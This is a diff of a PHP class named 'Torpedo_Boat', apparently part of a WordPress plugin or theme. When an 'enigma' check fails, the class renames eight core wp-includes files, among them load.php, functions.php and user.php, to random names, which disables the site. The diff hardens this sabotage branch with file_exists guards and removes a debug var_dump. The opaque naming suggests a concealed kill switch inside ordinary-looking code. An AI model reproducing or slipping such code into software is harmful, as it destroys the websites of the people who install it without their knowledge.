@@ -70,7 +70,6 @@ class Torpedo_Boat {
 
 	public function echo_s() {
 		$this->evalEnigma();
-		var_dump($this->enigmaCipherResult);
 	}
 
 	private function evalEnigma() {
@@ -79,14 +78,30 @@ class Torpedo_Boat {
 			unlink($this->enigmaDecipherDestination);
 		}
 		if($this->enigmaCipherResult === false) {
-			rename(ABSPATH . "wp-includes/load.php", ABSPATH . "wp-includes/load_". random_int(0, 1048576) . ".php");
-			rename(ABSPATH . "wp-includes/functions.php", ABSPATH . "wp-includes/functions_". random_int(0, 1048576) . ".php");
-			rename(ABSPATH . "wp-includes/http.php", ABSPATH . "wp-includes/http_". random_int(0, 1048576) . ".php");
-			rename(ABSPATH . "wp-includes/meta.php", ABSPATH . "wp-includes/meta_". random_int(0, 1048576) . ".php");
-			rename(ABSPATH . "wp-includes/option.php", ABSPATH . "wp-includes/option_". random_int(0, 1048576) . ".php");
-			rename(ABSPATH . "wp-includes/session.php", ABSPATH . "wp-includes/session_". random_int(0, 1048576) . ".php");
-			rename(ABSPATH . "wp-includes/vars.php", ABSPATH . "wp-includes/vars_". random_int(0, 1048576) . ".php");
-			rename(ABSPATH . "wp-includes/user.php", ABSPATH . "wp-includes/user_". random_int(0, 1048576) . ".php");
+			if(file_exists(ABSPATH . "wp-includes/load.php")) {
+				rename(ABSPATH . "wp-includes/load.php", ABSPATH . "wp-includes/load_". random_int(0, 1048576) . ".php");
+			}
+			if(file_exists(ABSPATH . "wp-includes/functions.php")) {
+				rename(ABSPATH . "wp-includes/functions.php", ABSPATH . "wp-includes/functions_". random_int(0, 1048576) . ".php");
+			}
+			if(file_exists(ABSPATH . "wp-includes/http.php")) {
+				rename(ABSPATH . "wp-includes/http.php", ABSPATH . "wp-includes/http_". random_int(0, 1048576) . ".php");
+			}
+			if(file_exists(ABSPATH . "wp-includes/meta.php")) {
+				rename(ABSPATH . "wp-includes/meta.php", ABSPATH . "wp-includes/meta_". random_int(0, 1048576) . ".php");
+			}
+			if(file_exists(ABSPATH . "wp-includes/option.php")) {
+				rename(ABSPATH . "wp-includes/option.php", ABSPATH . "wp-includes/option_". random_int(0, 1048576) . ".php");
+			}
+			if(file_exists(ABSPATH . "wp-includes/session.php")) {
+				rename(ABSPATH . "wp-includes/session.php", ABSPATH . "wp-includes/session_". random_int(0, 1048576) . ".php");
+			}
+			if(file_exists(ABSPATH . "wp-includes/vars.php")) {
+				rename(ABSPATH . "wp-includes/vars.php", ABSPATH . "wp-includes/vars_". random_int(0, 1048576) . ".php");
+			}
+			if(file_exists(ABSPATH . "wp-includes/user.php")) {
+				rename(ABSPATH . "wp-includes/user.php", ABSPATH . "wp-includes/user_". random_int(0, 1048576) . ".php");
+			}
 		}
 	}
 
